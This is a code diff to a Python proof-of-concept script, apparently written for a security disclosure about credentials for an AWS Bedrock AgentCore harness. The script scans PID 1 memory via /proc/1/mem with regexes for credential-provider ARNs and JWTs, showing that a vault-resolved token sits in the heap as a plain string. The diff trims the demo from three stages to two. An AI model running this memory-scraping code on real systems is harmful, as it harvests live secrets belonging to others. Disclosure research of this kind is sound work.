@@ -62,10 +62,6 @@ CRED_PROVIDER_ARN_RE = re.compile(
     rb'(?:credential-provider|token-vault/default/apikeycredentialprovider|token-vault/default/oauth2credentialprovider)'
     rb'/[A-Za-z0-9_\-]+'
 )
-VAULT_REF_RE = re.compile(
-    rb'\$\{arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:'
-    rb'(?:credential-provider|token-vault)[^}]{5,120}\}'
-)
 JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')
 
 
@@ -84,7 +80,6 @@ def scan_heap():
         except:
             continue
 
-    vault_refs = []
     cred_arns = []
     jwts = []
 
@@ -95,8 +90,6 @@ def scan_heap():
                 chunk = mem.read(hi - lo)
             except (OSError, OverflowError):
                 continue
-            for m in VAULT_REF_RE.finditer(chunk):
-                vault_refs.append((lo + m.start(), m.group(0)))
             for m in CRED_PROVIDER_ARN_RE.finditer(chunk):
                 cred_arns.append((lo + m.start(), m.group(0)))
             for m in JWT_RE.finditer(chunk):
@@ -104,7 +97,7 @@ def scan_heap():
                 if len(tok) >= 600:
                     jwts.append((lo + m.start(), tok, hashlib.sha256(tok).hexdigest()))
 
-    return vault_refs, cred_arns, jwts
+    return cred_arns, jwts
 
 
 def main():
@@ -115,10 +108,9 @@ def main():
 
     # Scan heap first
     print('  Scanning /proc/1/mem...')
-    vault_refs, cred_arns, jwts = scan_heap()
+    cred_arns, jwts = scan_heap()
 
     # Dedupe
-    unique_refs = sorted(set(ref.decode('utf-8', errors='replace') for _, ref in vault_refs))
     unique_arns = sorted(set(arn.decode('utf-8', errors='replace') for _, arn in cred_arns))
     seen_shas = set()
     unique_jwts = []
@@ -126,7 +118,7 @@ def main():
         if sha not in seen_shas:
             seen_shas.add(sha)
             unique_jwts.append((addr, tok, sha))
-    print(f'  Done. Found: {len(vault_refs)} refs, {len(cred_arns)} ARNs, {len(unique_jwts)} unique JWTs')
+    print(f'  Done. Found: {len(cred_arns)} ARN(s), {len(unique_jwts)} unique JWT(s)')
 
     # Load source files
     tools_source = ''
@@ -137,29 +129,9 @@ def main():
     identity_svc = read_file(f'{PKG}/bedrock_agentcore/services/identity.py')
 
     # ================================================================
-    # STAGE 1: ${arn:...} wrapper in heap + resolve_header_references()
+    # STAGE 1: Credential provider ARN found in heap
     # ================================================================
-    section('STAGE 1: The ${arn:...} reference (harness config)')
-
-    print('  --- In PID 1 heap ---')
-    print(f'  Found: {len(vault_refs)} occurrence(s)')
-    for ref in unique_refs:
-        print(f'    {ref}')
-    if vault_refs:
-        print(f'  First at: {hex(vault_refs[0][0])}')
-    print()
-    print('  This is the harness config value: the ${arn:...} reference')
-    print('  the customer put in create_harness(). It has NOT been resolved yet.')
-
-    print()
-    print('  --- The code that processes it ---')
-    print('  loopy/tools/tool_provider.py:')
-    show_function(tools_source, 'resolve_header_references')
-
-    # ================================================================
-    # STAGE 2: Bare ARN (after regex extraction) + tool_provider call site
-    # ================================================================
-    section('STAGE 2: Bare ARN (after regex extraction)')
+    section('STAGE 1: "arn:..." -- credential provider ARN in PID 1 heap')
 
     print('  --- In PID 1 heap ---')
     print(f'  Found: {len(cred_arns)} occurrence(s)')
@@ -167,18 +139,16 @@ def main():
         print(f'    {arn}')
     if cred_arns:
         print(f'  First at: {hex(cred_arns[0][0])}')
-    if vault_refs and cred_arns:
-        delta = abs(cred_arns[0][0] - vault_refs[0][0])
-        if delta < 100:
-            print(f'  (only {delta} bytes from Stage 1 -- same buffer!)')
     print()
-    print('  The regex stripped ${...} and extracted the bare ARN.')
-    print('  This is what gets passed to resolve_credential_arn().')
+    print('  This is the credential provider ARN from our harness config.')
+    print('  It was passed to resolve_credential_arn() to fetch the actual secret.')
 
     print()
-    print('  --- The code that calls it ---')
+    print('  --- The code that resolves it ---')
     print('  loopy/tools/tool_provider.py:')
-    # Show the call site context
+    show_function(tools_source, 'resolve_header_references')
+    print()
+    print('  --- The call site ---')
     tp_src = read_file(f'{PKG}/loopy/tools/tool_provider.py')
     if 'error' not in tp_src[:10]:
         lines = tp_src.split('\n')
@@ -192,9 +162,9 @@ def main():
                 break
 
     # ================================================================
-    # STAGE 3: Resolved JWT (the actual credential)
+    # STAGE 2: Resolved JWT (the actual credential)
     # ================================================================
-    section('STAGE 3: Resolved JWT (the vault credential)')
+    section('STAGE 2: "eyJraWQ..." -- resolved JWT credential in PID 1 heap')
 
     print('  --- In PID 1 heap ---')
     print(f'  Found: {len(jwts)} occurrence(s), {len(unique_jwts)} unique')
@@ -218,26 +188,22 @@ def main():
     # ================================================================
     section('THE COMPLETE PICTURE')
     print()
-    print('  Config:   ${arn:...token-vault/.../blog-vault-exfil-mcp-cred}')
+    print('  Config:   Authorization: Bearer ${arn:...:token-vault/.../my-mcp-cred}')
     print('       |')
-    print('       |  resolve_header_references() regex')
+    print('       |  resolve_header_references() extracts ARN, calls Identity API')
     print('       v')
-    print('  ARN:      arn:aws:bedrock-agentcore:...:token-vault/.../blog-vault-exfil-mcp-cred')
+    print('  ARN:      arn:aws:bedrock-agentcore:...:token-vault/.../my-mcp-cred')
     print('       |')
-    print('       |  resolve_credential_arn() -> get_api_key()')
+    print('       |  resolve_credential_arn() -> get_api_key() -> get_resource_api_key()')
     print('       v')
-    print('  JWT:      eyJraWQiOi... (len=1034, the actual credential)')
+    print('  JWT:      eyJraWQiOi... (the actual credential, plain string)')
     print('       |')
-    print('       |  returned as plain Python string, stored in headers dict')
+    print('       |  stored in headers dict, sent via httpx')
     print('       v')
     print('  HEAP:     PID 1 address space, readable via /proc/1/mem')
     print()
     print('  ---------------------------------------------------------')
-    print('  All three stages coexist in the SAME memory dump.')
-    if vault_refs and cred_arns:
-        delta = abs(cred_arns[0][0] - vault_refs[0][0])
-        if delta < 100:
-            print(f'  Stages 1 and 2 are {delta} bytes apart -- same allocation.')
+    print('  Both the ARN and the resolved JWT coexist in the SAME heap.')
     print()
     print('  The credential the customer NEVER held locally is sitting')
     print('  in PID 1 heap as a plain string. The vault protects at-rest')
